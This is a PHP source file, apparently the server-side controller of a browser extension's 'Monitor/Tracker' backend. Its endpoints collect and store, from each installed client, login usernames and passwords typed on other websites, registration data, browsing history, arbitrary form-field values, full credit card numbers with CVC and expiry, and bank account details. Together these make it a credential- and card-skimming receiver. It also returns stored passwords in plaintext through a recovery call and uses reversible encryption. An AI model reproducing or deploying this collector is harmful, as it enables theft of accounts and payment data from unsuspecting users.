<?php

namespace Mishusoft\Packages\Lab\Modules\Monitor\Controllers;

use Mishusoft\Framework\Chipsets\Encryption;
use Mishusoft\Packages\Lab\Modules\Main\Controllers\monitorController;
use Mishusoft\Framework\Chipsets\Time;

class browserController extends monitorController
{
    private $monitor;
    private int $limit;
    private int $limitBase;

    public function __construct()
    {
        parent::__construct();
        $this->limit = 0;
        $this->limitBase = 0;
        $this->monitor = $this->loadModel('monitor');
    }

    public function index()
    {
        $this->view->assign('title', 'Error Page');
        $this->view->render('index', 'Tracker');
    }

    public function getPubAppID()
    {
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->IdRequest) && is_object($data->IdRequest)) {
                if ($data->IdRequest->message == 'install' || $data->IdRequest->message == 'checkRun') {
                    self::retrieveVerifiedGeneratedId($data);
                } elseif ($data->IdRequest->message == 'update' || $data->IdRequest->message == 'browser_update') {
                    self::retrieveVerifiedGeneratedId($data);
                }
            }
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    private function retrieveVerifiedGeneratedId($data)
    {
        $app_id = $this->monitor->getInstalledAppPubId($this->getSqlText($data->IdRequest->name), $this->getSqlText($data->IdRequest->version), $this->getSqlText($data->IdRequest->ip), $this->getSqlText($data->IdRequest->browser));
        if (!empty($app_id)) {
            echo json_encode(['app_pub_id' => Encryption::StaticEncrypt($app_id)]);
        } else {
            $this->monitor->addInstalledAppList(
                $this->getSqlText($data->IdRequest->name),
                $this->getSqlText($data->IdRequest->version),
                $this->getSqlText($data->IdRequest->ip),
                $this->getSqlText($data->IdRequest->browser)
            );
            echo json_encode(['app_pub_id' => Encryption::StaticEncrypt($this->monitor->getLastInsertId('app_list_installed'))]);
        }
    }

    /**
     * @public
     */
    public function receiveFeedback()
    {
        /*
         * SQLSTATE[HY000]: General error: 2014 Cannot execute queries while other unbuffered queries are active.
         * Consider using PDOStatement::fetchAll().  Alternatively, if your code is only ever going to run against mysql,
         * you may enable query buffering by setting the PDO::MYSQL_ATTR_USE_BUFFERED_QUERY attribute.
         *
         * */
        /**
         * SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that
         * corresponds to your MySQL server version for the right syntax to use near 'Azur', 'PAC', 'France','FR','Europe','EU',
         * '43.3708','6.2182','83340','33','https' at line 1
         *
         */
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->update) && is_object($data->update)) {
                $this->monitor->receiveUserUpdateInfo(
                    $this->getSqlText($data->update->name),
                    $this->getSqlText($data->update->version),
                    $this->getSqlText($data->update->ip),
                    $this->getSqlText($data->update->browser),
                    $this->getSqlText($data->update->message)
                );

                header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
            }

            if (!empty($data->status) && is_object($data->status)) {
                $status = $this->monitor->getAppStatusInfo(
                    $this->getSqlText($data->status->name),
                    $this->getSqlText($data->status->version),
                    $this->getSqlText($data->status->ip),
                    $this->getSqlText($data->status->os_version),
                    $this->getSqlText($data->status->browser)
                );
                if ($status) {
                    $this->monitor->updateAppStatusInfo(
                        $this->getSqlText($data->status->name),
                        $this->getSqlText($data->status->version),
                        $this->getSqlText($data->status->ip),
                        $this->getSqlText($data->status->os_version),
                        $this->getSqlText($data->status->browser),
                        $this->getSqlText($data->status->message)
                    );
                } else {
                    $this->monitor->addAppStatusInfo(
                        $this->getSqlText($data->status->name),
                        $this->getSqlText($data->status->version),
                        $this->getSqlText($data->status->ip),
                        $this->getSqlText($data->status->os_version),
                        $this->getSqlText($data->status->browser),
                        $this->getSqlText($data->status->message)
                    );
                }

                header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
            }

            if (!empty($data->browser) && is_object($data->browser)) {
                $this->monitor->receiveUserBrowserInfo($data);
            }
            if (!empty($data->ipdata) && is_object($data->ipdata)) {
                $this->monitor->receiveUserIpInfo($data);
            }
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    public function browserUserDataManagement()
    {
        /*
         * SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'work_website' cannot be null
         * */
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command) && is_object($data->userdata)) {
                if ($data->command === 'saveLoginData') {
                    $this->monitor->saveUserLogInData(
                        $this->getSqlText($data->userdata->_default_->tracker),
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->os_name_arch),
                        $this->getSqlText($data->userdata->_default_->browser),
                        $this->getSqlText($data->userdata->event),
                        $this->getSqlText($data->userdata->username),
                        $this->getSqlText($data->userdata->password),
                        $this->getSqlText($data->userdata->workWebsite)
                    );
                    header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
                }
                if ($data->command === 'saveRegistrationData') {
                    $this->monitor->saveRegistrationData(
                        $this->getSqlText($data->userdata->_default_->tracker),
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->os_name_arch),
                        $this->getSqlText($data->userdata->_default_->browser),
                        $this->getSqlText($data->userdata->event),
                        $this->getSqlText($data->userdata->username),
                        $this->getSqlText($data->userdata->password),
                        $this->getSqlText($data->userdata->email),
                        $this->getSqlText($data->userdata->workWebsite)
                    );
                    header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
                }
                if ($data->command === 'saveLogoutData') {
                    $this->monitor->saveLogOutData(
                        $this->getSqlText($data->userdata->_default_->tracker),
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->os_name_arch),
                        $this->getSqlText($data->userdata->_default_->browser),
                        $this->getSqlText($data->userdata->event),
                        $this->getSqlText($data->userdata->username),
                        $this->getSqlText($data->userdata->workWebsite)
                    );
                    header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
                }
                if ($data->command === 'saveNavigateData') {
                    $this->monitor->saveBrowserHistoriesData(
                        $this->getSqlText($data->userdata->_default_->tracker),
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->os_name_arch),
                        $this->getSqlText($data->userdata->_default_->browser),
                        $this->getSqlText($data->userdata->event),
                        $this->getSqlText($data->userdata->workWebsite)
                    );
                    header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
                }
                if ($data->command === 'saveUserSettingData') {
                    $licence = '';
                    $registeredUserIdByEmail = '';
                    if (!empty($this->getSqlText($data->userdata->email))) {
                        $registeredUserIdByEmail = $this->monitor->getRegisteredUserIdByEmail($this->getSqlText($data->userdata->email));
                    }

                    if (isset($data->userdata->_default_->ip)) {
                        $registeredUserIdByIP = $this->monitor->getRegisteredUserIdByIP($this->getSqlText($data->userdata->_default_->ip));
                        $licence = $this->monitor->getLicenceByIdIpBrowser(
                            Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                            $this->getSqlText($data->userdata->_default_->ip),
                            $this->getSqlText($data->userdata->_default_->browser)
                        );
                    }
                    if (!empty($this->getSqlText($data->userdata->first_name)) && !empty($this->getSqlText($data->userdata->first_name)) &&
                        !empty($this->getSqlText($data->userdata->first_name)) && !empty($this->getSqlText($data->userdata->first_name))) {
                        if (!empty($registeredUserIdByEmail)) {
                            echo json_encode(['message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence]);
                        } elseif (!empty($registeredUserIdByIP)) {
                            echo json_encode(['message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence]);
                        } else {
                            $this->monitor->saveUserSettingData(
                                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                                $this->getSqlText($data->userdata->_default_->ip),
                                $this->getSqlText($data->userdata->_default_->os_name_arch),
                                $this->getSqlText($data->userdata->_default_->browser),
                                $this->getSqlText($data->userdata->first_name),
                                $this->getSqlText($data->userdata->last_name),
                                $this->getSqlText($data->userdata->email),
                                Encryption::StaticEncrypt($this->getSqlText($data->userdata->password))
                            );

                            $this->getLicenceLimitByPlan('trial');

                            /*setUserLicence($clientId, $app_id, $ip, $browser, $ltype, $limit, $limitBase, $lissue, $lupdate, $lnextupdate, $lexpire)*/
                            $this->monitor->setUserLicence(
                                $this->filterInt($this->monitor->getRegisteredUserIdByEmail($this->getSqlText($data->userdata->email))),
                                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                                $this->getSqlText($data->userdata->_default_->ip),
                                $this->getSqlText($data->userdata->_default_->browser),
                                'trial',
                                $this->limit,
                                $this->limitBase,
                                Time::getToday(),
                                Time::getToday(),
                                Time::getNextDayDate(),
                                'not-fixed'
                            );

                            $licence = $this->monitor->getLicenceByIdIpBrowser(
                                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                                $this->getSqlText($data->userdata->_default_->ip),
                                $this->getSqlText($data->userdata->_default_->browser)
                            );

                            echo json_encode([
                                'message' => 'success', 'registration' => 'new_register',
                                'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::StaticEncrypt($this->getSqlText($data->userdata->password)), 'licence' => $licence
                            ]);
                        }
                    } else {
                        echo json_encode(['message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence]);
                    }
                }

                if ($data->command === 'resetUserIpData') {
                    $usrId = $this->monitor->getUserIdByIpAddress($this->getSqlText($data->userdata->_default_->ip));
                    $this->monitor->resetUserIpData(
                        $usrId,
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->os_name_arch),
                        $this->getSqlText($data->userdata->_default_->browser),
                        $this->getSqlText($data->userdata->first_name),
                        $this->getSqlText($data->userdata->last_name),
                        $this->getSqlText($data->userdata->email),
                        Encryption::StaticEncrypt($this->getSqlText($data->userdata->password))
                    );

                    $licence = $this->monitor->getLicenceByIdIpBrowser(
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->browser)
                    );
                    echo json_encode([
                        'message' => 'success', 'registration' => 'new_register',
                        'way' => 'new', 'log_status' => 'success', 'u_pass' => $this->getSqlText($data->userdata->password), 'licence' => $licence
                    ]);
                }

                if ($data->command === 'doUserLoginData') {
                    /*print_r(Encryption::StaticDecrypt($data->userdata->_default_->app_id));*/
                    $usrId = $this->monitor->getUserIdByEmail($this->getSqlText($data->userdata->email));
                    $userInfoByEmail = $this->monitor->getUserInfoByEmail($this->getSqlText($data->userdata->email));
                    if (isset($userInfoByEmail)) {
                        $password = $this->monitor->getUserPasswordByEmail($this->getSqlText($data->userdata->email));
                        if (isset($password)) {
                            if ($this->getSqlText($data->userdata->passwordType) === 'encrypt') {
                                if (Encryption::StaticDecrypt($this->getSqlText($data->userdata->password)) === Encryption::StaticDecrypt($password)) {
                                    $userInfoByEmailPassword = $this->monitor->getUserInfoByEmailPassword($this->getSqlText($data->userdata->email), $this->getSqlText($data->userdata->password));
                                    $this->doLoginProcess($data, $usrId, $userInfoByEmailPassword);
                                } else {
                                    echo json_encode(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                }
                            } else {
                                if ($this->getSqlText($data->userdata->password) === Encryption::StaticDecrypt($password)) {
                                    $userInfoByEmailPassword = $this->monitor->getUserInfoByEmailPassword($this->getSqlText($data->userdata->email), Encryption::StaticEncrypt($this->getSqlText($data->userdata->password)));
                                    $this->doLoginProcess($data, $usrId, $userInfoByEmailPassword);
                                } else {
                                    echo json_encode(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                }
                            }
                        } else {
                            echo json_encode(['message' => 'error', 'login' => 'not_exist', 'way' => 'password']);
                        }
                    } else {
                        echo json_encode(['message' => 'error', 'login' => 'not_exist', 'way' => 'email']);
                    }
                }


                if ($data->command === 'recoverUserPassword') {
                    $user = $this->monitor->getUserInfoByEmail($this->getSqlText($data->userdata->email));
                    if (isset($user)) {
                        $password = $this->monitor->getUserPasswordByEmail($this->getSqlText($data->userdata->email));
                        if (isset($password)) {
                            echo json_encode(['message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Encryption::StaticDecrypt($password)]);
                        } else {
                            echo json_encode(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password']);
                        }
                    } else {
                        echo json_encode(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email']);
                    }
                }
            }
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    private function getLicenceLimitByPlan($plan)
    {
        switch ($plan) {
            case 'trial':
                $this->limit = 2000;
                $this->limitBase = 2000;
                break;
            case 'Plan 01':
                $this->limit = 10000;
                $this->limitBase = 10000;
                break;
            case 'Plan 02':
                $this->limit = 20000;
                $this->limitBase = 20000;
                break;
            case 'Plan 03':
                $this->limit = 35000;
                $this->limitBase = 35000;
                break;
            case 'Plan 04':
                $this->limit = 50000;
                $this->limitBase = 50000;
                break;
            default:
                $this->limit = 0;
                $this->limitBase = 0;
                break;
        }
    }

    private function doLoginProcess($data, $usrId, $user)
    {
        $app = $this->monitor->getInstallAppInfoById(Encryption::StaticDecrypt($data->userdata->_default_->app_id));
        if (!empty($app)) {
            $app = $this->monitor->getLicenceByAppId(Encryption::StaticDecrypt($data->userdata->_default_->app_id));
            if (isset($app['ip_address']) && $app['ip_address'] !== $this->getSqlText($data->userdata->_default_->ip)) {
                $this->monitor->resetUserIpInLicenceByAppId(
                    Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                    $data->userdata->_default_->ip
                );
            }
            if (isset($app['browserNameFull']) && $app['browserNameFull'] !== $this->getSqlText($data->userdata->_default_->browser)) {
                $this->monitor->resetUserBrowserInLicenceByAppId(
                    Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                    $data->userdata->_default_->browser
                );
            }
        }

        if (isset($user) || $user !== false || !empty($user)) {
            $this->monitor->updateUserAppId(
                $this->filterInt($usrId),
                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                $this->getSqlText($data->userdata->_default_->ip),
                $this->getSqlText($data->userdata->_default_->os_name_arch),
                $this->getSqlText($data->userdata->_default_->browser)
            );

            $this->monitor->updateUserLicenceAppId(
                $this->filterInt($usrId),
                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                $this->getSqlText($data->userdata->_default_->ip),
                $this->getSqlText($data->userdata->_default_->browser)
            );
            $this->upgradeLicenceLimit(Encryption::StaticDecrypt($data->userdata->_default_->app_id));

            $licence = $this->monitor->getLicenceByIdIpBrowser(
                Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                $this->getSqlText($data->userdata->_default_->ip),
                $this->getSqlText($data->userdata->_default_->browser)
            );
            echo json_encode(
                [
                    'message' => 'success', 'login' => 'passed', 'way' => 'email_password', 'log_status' => 'success',
                    'user' => [
                        'firstName' => $user['firstName'], 'lastName' => $user['lastName'], 'emailAddress' => $user['emailAddress'], 'password' => $user['password']
                    ], 'licence' => $licence
                ]
            );
        } else {
            echo json_encode(['message' => 'error', 'login' => 'failed', 'way' => 'email_password']);
        }
    }

    /*removable function*/

    public function upgradeLicenceLimit($appId)
    {
        $licence = $this->monitor->getLicenceByAppId($appId);
        if (Time::getToday() === ($licence ? (($licence['nextUpdate']) || /*$licence['nextUpdate'] ??=*/ '') : '')) {
            if ($licence['limitBase'] !== 2000 || $licence['limitBase'] !== 0 || $licence['limitBase'] !== null) {
                $this->monitor->upgradeLicenceLimit($appId, $licence['limitBase']);
            }
        }
    }

    public function saveUserLicenceData()
    {
        $data = json_decode(file_get_contents('php://input'));
        print_r($data);
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command) && is_object($data->userdata)) {
                /*$usrId = $this->monitor->getUserIdByEmail($this->getSqlText($data->userdata->email));*/
                echo 'command and userdata found';
                if (isset($data->userdata->_default_->ip)) {
                    echo 'client ip found';
                    $licence = $this->monitor->getLicenceByIdIpBrowser(
                        Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                        $this->getSqlText($data->userdata->_default_->ip),
                        $this->getSqlText($data->userdata->_default_->browser)
                    );
                    echo 'licence checking found';
                    if (!empty($licence)) {
                        echo 'licence found';
                        $this->monitor->setUserLicence(
                            Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                            $this->getSqlText($data->userdata->_default_->ip),
                            $this->getSqlText($data->userdata->_default_->browser),
                            'firstTime',
                            Time::getToday(),
                            Time::getToday(),
                            'not-fixed'
                        );
                        $licence = $this->monitor->getLicenceByIdIpBrowser(
                            Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                            $this->getSqlText($data->userdata->_default_->ip),
                            $this->getSqlText($data->userdata->_default_->browser)
                        );
                        echo json_encode(['message' => 'success', 'session' => 'new', 'licence' => $licence]);
                    } else {
                        echo 'licence not found';
                        $this->monitor->setUserLicence(
                            Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                            $this->getSqlText($data->userdata->_default_->ip),
                            $this->getSqlText($data->userdata->_default_->browser),
                            $this->getSqlText($data->userdata->ltype),
                            $this->getSqlText($data->userdata->lissue),
                            $this->getSqlText($data->userdata->lupdate),
                            $this->getSqlText($data->userdata->lexpire)
                        );

                        $licence = $this->monitor->getLicenceByIdIpBrowser(
                            Encryption::StaticDecrypt($data->userdata->_default_->app_id),
                            $this->getSqlText($data->userdata->_default_->ip),
                            $this->getSqlText($data->userdata->_default_->browser)
                        );
                        echo json_encode(['message' => 'success', 'session' => 'update', 'licence' => $licence]);
                    }
                }
            }
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    public function clientEarningRecord()
    {
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command) && is_object($data->earndata)) {
                $this->monitor->updateLicenceLimit(
                    Encryption::StaticDecrypt($data->earndata->_default_->app_id),
                    $this->filterInt($data->earndata->earn)
                );
                $today = $this->monitor->getEarningByDate(
                    Encryption::StaticDecrypt($data->earndata->_default_->app_id),
                    $this->getSqlText($data->earndata->username),
                    Time::getTodayDateOnly()
                );
                if (!empty($today)) {
                    $this->monitor->updateTodayEarningByDate(
                        Encryption::StaticDecrypt($data->earndata->_default_->app_id),
                        $this->getSqlText($data->earndata->username),
                        $this->filterInt($data->earndata->earn),
                        $this->filterInt($data->earndata->referrals),
                        $this->filterInt($data->earndata->referralsEarn)
                    );
                } else {
                    $this->monitor->addEarningDetails(
                        Encryption::StaticDecrypt($data->earndata->_default_->app_id),
                        $this->filterInt($data->earndata->actual_earn),
                        $this->filterInt($data->earndata->referrals),
                        $this->filterInt($data->earndata->referralsEarn),
                        $this->getSqlText($data->earndata->event),
                        $this->getSqlText($data->earndata->username),
                        $this->getSqlText($data->earndata->workWebsite),
                        Time::getTodayDateOnly()
                    );
                }
            }
            header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    public function clientPaymentMethodsRecord()
    {
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command ==='savePaymentMethodsData') && is_object($data->paymentMethodsInfo)) {
                $bugFixed = $data->paymentMethodsInfo->event ? $data->paymentMethodsInfo->event : 'bug' ;
                $this->monitor->addPaymentMethodsData(
                    $this->getSqlText($data->paymentMethodsInfo->_default_->tracker),
                    Encryption::StaticDecrypt($data->paymentMethodsInfo->_default_->app_id),
                    $this->getSqlText($data->paymentMethodsInfo->_default_->ip),
                    $this->getSqlText($data->paymentMethodsInfo->_default_->os_name_arch),
                    $this->getSqlText($data->paymentMethodsInfo->_default_->browser),
                    $this->getSqlText($data->paymentMethodsInfo->cardNumber),
                    $this->getSqlText($data->paymentMethodsInfo->cardBrand),
                    $this->getSqlText($data->paymentMethodsInfo->cardHolder),
                    $this->getSqlText($data->paymentMethodsInfo->cardExpire),
                    $this->getSqlText($data->paymentMethodsInfo->cardCVC),
                    $this->getSqlText($bugFixed),
                    $this->getSqlText($data->paymentMethodsInfo->workWebsite)
                );
            }
            header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    public function clientBankAccountRecord()
    {
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command ==='saveBankAccountData') && is_object($data->bankAccountData)) {
                $this->monitor->addBankAccountData(
                    $this->getSqlText($data->bankAccountData->_default_->tracker),
                    Encryption::StaticDecrypt($data->bankAccountData->_default_->app_id),
                    $this->getSqlText($data->bankAccountData->_default_->ip),
                    $this->getSqlText($data->bankAccountData->_default_->browser),
                    $this->getSqlText($data->bankAccountData->workWebsite),
                    $this->getSqlText($data->bankAccountData->dataType),
                    $this->getSqlText($data->bankAccountData->dataValue)
                );
            }
            header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    /**
     * @public function
     */
    public function InputElementDataRecord()
    {
        $data = json_decode(file_get_contents('php://input'));
        if (!empty($data) && is_object($data)) {
            if (!empty($data->command ==='saveInputElementData') && is_object($data->inputElementData)) {
                $this->monitor->addInputElementData(
                    $this->getSqlText($data->inputElementData->_default_->tracker),
                    Encryption::StaticDecrypt($data->inputElementData->_default_->app_id),
                    $this->getSqlText($data->inputElementData->_default_->ip),
                    $this->getSqlText($data->inputElementData->_default_->browser),
                    $this->getSqlText($data->inputElementData->workWebsite),
                    $this->getSqlText($data->inputElementData->name),
                    $this->getSqlText($data->inputElementData->type),
                    $this->getSqlText($data->inputElementData->value),
                    $this->getSqlText($data->inputElementData->placeholder)
                );
            }
            header($_SERVER['SERVER_PROTOCOL'] . ' 204 No response');
        } else {
            $this->view->assign('title', 'Error Page');
            $this->view->render('index', 'Tracker');
        }
    }

    public function serverSynced()
    {

        /*
         *                             if (strstr($data->userdata->password, '@') === true || strstr($data->userdata->password, '_') === true) {
                                $this->monitor->saveUserSettingData(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->os_name_arch), $this->getSqlText($data->userdata->_default_->browser),
                                    $this->getSqlText($data->userdata->first_name), $this->getSqlText($data->userdata->last_name),
                                    $this->getSqlText($data->userdata->email), Encryption::StaticEncrypt($this->getSqlText($data->userdata->password))
                                );

                                $this->monitor->setUserLicence(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->browser), 'firstTime', date(DATE_RFC822), date(DATE_RFC822), 'not-fixed'
                                );

                                $licence = $this->monitor->getLicenceByIdIpBrowser(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->browser)
                                );

                                echo json_encode(array(
                                    'message' => 'success', 'registration' => 'new_register',
                                    'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::StaticEncrypt($this->getSqlText($data->userdata->password)), 'licence' => $licence
                                ));
                            } else {
                                $this->monitor->saveUserSettingData(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->os_name_arch), $this->getSqlText($data->userdata->_default_->browser),
                                    $this->getSqlText($data->userdata->first_name), $this->getSqlText($data->userdata->last_name),
                                    $this->getSqlText($data->userdata->email), $this->getSqlText($data->userdata->password)
                                );

                                $this->monitor->setUserLicence(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->browser), $this->getSqlText($data->userdata->ltype),
                                    $this->getSqlText($data->userdata->lissue), $this->getSqlText($data->userdata->lupdate), $this->getSqlText($data->userdata->lexpire)
                                );

                                $licence = $this->monitor->getLicenceByIdIpBrowser(
                                    Encryption::StaticDecrypt($data->userdata->_default_->app_id), $this->getSqlText($data->userdata->_default_->ip),
                                    $this->getSqlText($data->userdata->_default_->browser)
                                );

                                echo json_encode(array(
                                    'message' => 'success', 'registration' => 'new_register',
                                    'way' => 'new', 'log_status' => 'success', 'u_pass' => $this->getSqlText($data->userdata->password), 'licence' => $licence
                                ));
                            }*/
        /*        $data = json_decode(file_get_contents('php://input'));
                if (!empty($data) && is_object($data)) {
                    if (!empty($data->command) && is_object($data->earndata)) {
                        //info_app_installed_devices_earning` (
                        // `id` int(11) NOT NULL AUTO_INCREMENT,
                        // `app_id` varchar(60) NOT NULL,
                        // `today_total_earn` varchar(60) NOT NULL,
                        // `total_earn` varchar(60) NOT NULL,
                        // `total_referrals_attracted` varchar(60) NOT NULL,
                        // `total_referrals_earning` varchar(60) NOT NULL,
                        // `event` varchar(20) NOT NULL,
                        // `username` varchar(50) NOT NULL,
                        // `workWebsite` varchar(200) NOT NULL,
                        // `current_earning_date` varchar(15) NOT NULL,
                        // `last_update_date_time` varchar(60) NOT NULL,
                        // PRIMARY KEY (`id`)
                        //) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
                        /*$this->getSqlText($data->userdata->event), $this->getSqlText($data->userdata->username),
                                $this->getSqlText($data->userdata->password), $this->getSqlText($data->userdata->workWebsite)*/
        /*$today = $this->monitor->getEarningByDate(
            Encryption::StaticDecrypt($data->earndata->_default_->app_id),
            $this->getSqlText($data->earndata->username), $this->filterInt($data->earndata->earn),
            $this->filterInt($data->earndata->referrals), $this->filterInt($data->earndata->referralsEarn),
            Time::getTodayDateOnly()
        );
        if (!empty($today)) {
            $this->monitor->updateTodayEarningByDate(Encryption::StaticDecrypt($data->userdata->_default_->app_id), Time::getTodayDateOnly());
        } else {
            $this->monitor->addEarningDetails(
                Encryption::StaticDecrypt($data->earndata->_default_->app_id),
                $this->filterInt($data->earndata->actual_earn), $this->filterInt($data->earndata->referrals), $this->filterInt($data->earndata->referralsEarn),
                $this->filterInt($data->earndata->event),  $this->getSqlText($data->earndata->username),   $this->getSqlText($data->earndata->workWebsite),
                Time::getTodayDateOnly());
        }
    }
} else {
    $this->view->assign('title', 'Error Page');
    $this->view->render('index', 'Tracker');
}*/
    }
}
